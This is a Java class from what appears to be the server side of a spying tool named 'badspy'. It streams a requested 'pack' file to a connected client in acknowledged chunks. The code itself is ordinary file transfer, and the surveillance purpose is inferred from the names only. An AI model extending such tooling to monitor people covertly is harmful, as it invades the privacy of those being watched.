package com.blogspot.sontx.badspy.badserver.bo.bdrworker;

import com.blogspot.sontx.badspy.badserver.Config;
import com.blogspot.sontx.badspy.badserver.Convert;
import com.blogspot.sontx.badspy.badserver.bean.SpyDataHeader;
import com.blogspot.sontx.badspy.badserver.bo.Receiver;
import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 25/4/2016.
 */
public class BdrDownloadPackHandler extends Receiver {
    public BdrDownloadPackHandler(SpyReader reader, SpyWriter writer, int dataLength) {
        super(reader, writer, dataLength);
    }

    @Override
    public void start() throws IOException {
        byte[] buffer = new byte[dataLength];
        if (reader.read(buffer) == buffer.length) {
            byte packId = buffer[0];
            File packFile = BdrPackManager.getPackFileById(packId);
            if (packFile != null)
                sendFile(packFile);
        }
    }

    private void sendFile(File packFile) {
        FileInputStream in = null;
        try {
            in = new FileInputStream(packFile);
            sendFileName(packFile);
            sendFileSize(packFile);
            sendFileContent(in);
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException e) {
                }
            }
        }
    }

    private void sendFileContent(FileInputStream in) throws IOException {
        int chunk;
        byte[] buffer = new byte[Config.READ_FILE_BUFFER_SIZE];
        SpyDataHeader chunkHeader = new SpyDataHeader();
        chunkHeader.setContentType(SpyDataHeader.HEADER_BDR_DT_FILECHUNK);
        while ((chunk = in.read(buffer)) > 0) {
            chunkHeader.setContentLength(chunk);
            writer.write(chunkHeader);
            writer.write(buffer, 0, chunk);
            if (reader.readFlag() != BdrWorker.FLAG_YES)
                break;
        }
    }

    private void sendFileSize(File packFile) throws IOException {
        byte[] fileSizeBytes = Convert.integerToBytes((int) packFile.length());
        SpyDataHeader header = new SpyDataHeader();
        header.setContentType(SpyDataHeader.HEADER_BDR_DT_FILESIZE);
        header.setContentLength(fileSizeBytes.length);
        writer.write(header);
        writer.write(fileSizeBytes, 0, fileSizeBytes.length);
    }

    private void sendFileName(File packFile) throws IOException {
        byte[] fileNameBytes = packFile.getName().getBytes();
        SpyDataHeader header = new SpyDataHeader();
        header.setContentType(SpyDataHeader.HEADER_BDR_DT_FILENAME);
        header.setContentLength(fileNameBytes.length);
        writer.write(header);
        writer.write(fileNameBytes, 0, fileNameBytes.length);
    }
}
